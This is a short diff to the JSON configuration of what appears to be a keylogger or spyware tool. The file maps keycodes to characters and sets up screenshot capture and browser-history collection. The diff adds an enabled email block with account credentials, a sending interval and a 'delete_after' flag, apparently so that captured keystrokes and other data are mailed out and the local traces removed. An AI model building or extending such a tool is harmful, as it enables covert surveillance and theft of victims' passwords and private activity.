@@ -29,7 +29,7 @@
             "[109]": "-",
             "[110]": ".",
             "[111]": "/",
-            "[F12]": "[EXIT]"
+            "[F12]": "[QUIT]"
         }
     },
 
@@ -47,7 +47,7 @@
         }
     },
 
-    "screenshot": {
+    "screenshots": {
         "enabled": false,
         "filename_format": "prtscr_{index}.png",
         "interval": 10,
@@ -59,5 +59,13 @@
         "filename_format": "{browser}_history.txt",
         "interval": 300,
         "limit": 100
+    },
+
+    "email": {
+        "enabled": true,
+        "email": "example@gmail.com",
+        "password": "aaaa bbbb cccc dddd",
+        "interval": 7200,
+        "delete_after": true
     }
 }
